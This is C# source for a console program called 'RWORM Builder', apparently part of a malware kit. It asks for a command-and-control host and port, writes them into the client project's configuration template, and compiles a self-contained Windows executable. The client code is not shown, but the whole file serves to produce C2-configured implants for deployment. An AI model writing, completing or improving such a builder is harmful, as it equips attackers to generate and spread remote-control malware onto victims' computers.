using System;
using System.IO;
using System.Text;

namespace RWORM.Builder
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("  RWORM Builder v1.0");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            Console.Write("C2 Host [127.0.0.1]: ");
            var host = Console.ReadLine();
            if (string.IsNullOrEmpty(host)) host = "127.0.0.1";

            Console.Write("C2 Port [3333]: ");
            var portStr = Console.ReadLine();
            int port = 3333;
            int.TryParse(portStr, out port);

            Console.Write("Output filename [RWORM.exe]: ");
            var output = Console.ReadLine();
            if (string.IsNullOrEmpty(output)) output = "RWORM.exe";

            Console.WriteLine();
            Console.WriteLine("Building client...");
            Console.WriteLine($"  Host: {host}");
            Console.WriteLine($"  Port: {port}");
            Console.WriteLine($"  Output: {output}");
            Console.WriteLine();

            BuildClient(host, port, output);

            Console.WriteLine();
            Console.WriteLine($"[+] Build complete: {output}");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        static string ResolveDotnetExe()
        {
            var localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var localDotnet = Path.Combine(localApp, "dotnet", "dotnet.exe");
            if (File.Exists(localDotnet)) return localDotnet;
            return "dotnet";
        }

        static void BuildClient(string host, int port, string output)
        {
            var clientPath = Path.Combine("..", "Client");
            var templatePath = Path.Combine(clientPath, "Core", "Config.cs");
            var configContent = File.ReadAllText(templatePath);

            configContent = configContent.Replace("127.0.0.1", host);
            configContent = configContent.Replace("3333", port.ToString());

            File.WriteAllText(templatePath, configContent);
            Console.WriteLine("[*] Config updated");

            var dotnetExe = ResolveDotnetExe();
            var outDir = Path.GetFullPath(Path.Combine("..", output.Replace(".exe", "")));

            var buildCmd = $"\"{dotnetExe}\" publish \"{Path.Combine(clientPath, "RWORM.Client.csproj")}\" -c Release -r win-x64 --self-contained -o \"{outDir}\"";
            Console.WriteLine($"[*] Running: {buildCmd}");

            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = dotnetExe,
                    Arguments = $"publish \"{Path.Combine(clientPath, "RWORM.Client.csproj")}\" -c Release -r win-x64 --self-contained -o \"{outDir}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                var dotnetDir = Path.GetDirectoryName(dotnetExe);
                if (!string.IsNullOrEmpty(dotnetDir) && Directory.Exists(dotnetDir))
                {
                    psi.EnvironmentVariables["DOTNET_ROOT"] = dotnetDir;
                    psi.EnvironmentVariables["PATH"] = dotnetDir + ";" + Environment.GetEnvironmentVariable("PATH");
                }

                var proc = System.Diagnostics.Process.Start(psi);
                if (proc != null)
                {
                    var stdout = proc.StandardOutput.ReadToEnd();
                    var stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();
                    if (proc.ExitCode != 0)
                    {
                        Console.WriteLine($"[!] Build failed:\n{stderr}\n{stdout}");
                    }
                    else
                    {
                        Console.WriteLine("[*] Build succeeded");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Build error: {ex.Message}");
            }
        }
    }
}
